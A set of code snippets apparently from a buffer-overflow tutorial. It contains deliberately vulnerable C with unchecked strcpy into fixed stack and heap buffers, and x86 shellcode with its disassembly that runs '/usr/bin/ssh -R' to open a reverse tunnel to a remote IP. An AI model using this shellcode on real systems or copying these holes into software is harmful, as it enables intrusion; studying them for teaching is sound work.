["```\n#include <stdio.h>\nvoid function1()\n{\n    int y = 1;\n    printf(\"This is function1\\n\");\n}\nvoid function2()\n{\n    int z = 2;\n    printf(\"This is function2\\n\");\n}\nint main (int argc, char **argv[])\n{  \n    int x = 10;\n    printf(\"This is the main function\\n\");\n    function1();\n    printf(\"After calling function1\\n\");\n    function2();\n    printf(\"After calling function2\");\n    return 0;\n}\n```", "```\nchar buffer;\n```", "```\n#include <stdio.h>\n#include <limits.h>\nint main()\n{\n    printf(\"The size for char : %d \\n\", sizeof(char));\n    return 0;\n}\n```", "```\n#include <stdio.h>\n#include <string.h>\n// This function will copy the user's input into buffer\nvoid copytobuffer(char* input)\n{\n   char buffer[15];\n   strcpy (buffer,input);\n}\nint main (int argc, char **argv[])\n{\n   copytobuffer(argv[1]);\n   return 0;\n}\n```", "```\n char* heap=malloc(15);\n```", "```\n\n#include <string.h>\n#include <stdlib.h>\nvoid main(int argc, char** argv)\n{\n  // Start allocating the heap\n    char* heap=malloc(15);\n  // Copy the user's input into heap\n    strcpy(heap, argv[1]);\n  // Free the heap section\n    free(heap);\n}\n```", "```\n\"\\x31\\xc0\\x50\\x68\\x2e\\x32\\x32\\x36\\x68\\x38\\x2e\\x30\\x30\\x68\\x32\\x2e\\x31\\x36\"\"\\x66\\x68\\x31\\x39\\x89\\xe6\\x50\\x68\\x74\\x3a\\x32\\x32\\x68\\x6c\\x68\\x6f\\x73\\x68\"\"\\x6c\\x6f\\x63\\x61\\x68\\x39\\x39\\x39\\x3a\\x66\\x68\\x30\\x39\\x89\\xe5\\x50\\x66\\x68\"\"\\x2d\\x52\\x89\\xe7\\x50\\x68\\x2f\\x73\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x68\\x2f\\x75\"\"\\x73\\x72\\x89\\xe3\\x50\\x56\\x55\\x57\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n```", "```\nxor    %eax,%eax\npush   %eax\npushl  $0x3632322e\npushl  $0x30302e38\npushl  $0x36312e32\npushw  $0x3931\nmovl   %esp,%esi\npush   %eax\npush   $0x32323a74\npush   $0x736f686c\npush   $0x61636f6c\npush   $0x3a393939\npushw  $0x3930\nmovl   %esp,%ebp\npush   %eax\npushw  $0x522d\nmovl   %esp,%edi\npush   %eax\npush   $0x6873732f\npush   $0x6e69622f\npush   $0x7273752f\nmovl   %esp,%ebx\npush   %eax\npush   %esi\npush   %ebp\npush   %edi\npush   %ebx\nmovl   %esp,%ecx\nmov    $0xb,%al\nint    $0x80\n```", "```\n#include <stdio.h>\nvoid printsomething()\n{\n    printf(\"Print something\\n\");\n}\nint main ()\n{\n    printsomething();\n\n    printf(\"This is after print something function\\n\");\n    return 0;\n}\n```", "```\ncat /usr/include/x86_64-linux-gnu/asm/unistd_64.h \n```"]